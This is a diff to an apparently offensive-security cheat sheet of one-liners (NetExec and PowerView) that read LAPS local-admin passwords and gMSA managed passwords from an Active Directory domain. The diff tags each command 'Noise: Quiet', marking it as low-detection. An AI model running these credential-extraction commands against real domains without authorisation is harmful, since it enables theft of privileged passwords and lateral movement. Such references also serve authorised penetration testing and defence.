@@ -10,7 +10,7 @@ One-liners for managed local passwords and group-managed service accounts.
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --module laps
 ```
 
-**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Quiet
 
 
 ## PowerView LAPS attributes
@@ -19,7 +19,7 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --module laps
 Get-DomainComputer -Properties dnshostname,ms-Mcs-AdmPwd,msLAPS-Password
 ```
 
-**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Quiet
 
 
 ## NetExec gMSA
@@ -28,7 +28,7 @@ Get-DomainComputer -Properties dnshostname,ms-Mcs-AdmPwd,msLAPS-Password
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --gmsa
 ```
 
-**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user
+**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Quiet
 
 
 ## PowerView gMSA accounts
@@ -37,7 +37,7 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --gmsa
 Get-DomainUser -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' -Properties samaccountname,msDS-ManagedPassword
 ```
 
-**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user
+**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Quiet
 
 ---
 
